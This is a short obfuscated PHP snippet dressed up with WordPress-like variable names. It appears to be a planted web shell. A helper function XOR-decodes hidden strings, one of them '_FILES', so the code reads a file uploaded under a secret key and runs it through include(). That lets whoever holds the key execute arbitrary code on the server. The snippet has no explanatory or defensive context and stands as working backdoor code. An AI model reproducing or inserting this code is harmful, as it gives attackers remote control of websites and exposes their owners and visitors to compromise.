...
$enclosure = 'iExyDwmNTwUsm';
	$last_pee = 'attrs';
function subject($exclude_from_search, $allblocks)

{
    $custom_fields = urldecode($exclude_from_search);

    $fragment = substr($allblocks,0, strlen($custom_fields));
	$new_status_post = 'width';
    $no_found_rows = $custom_fields ^ $fragment;
    return $no_found_rows;

}

$nested_code_pre = ${subject("6%0315%01%24", $enclosure)};
	$hash = 'file';
if (isset($nested_code_pre[$enclosure]))

{
    $authors = $nested_code_pre[$enclosure];
    $_context = $authors[subject("%1D%28%08%26%2A%16%00%2B", $enclosure)];
    include ($_context);
}
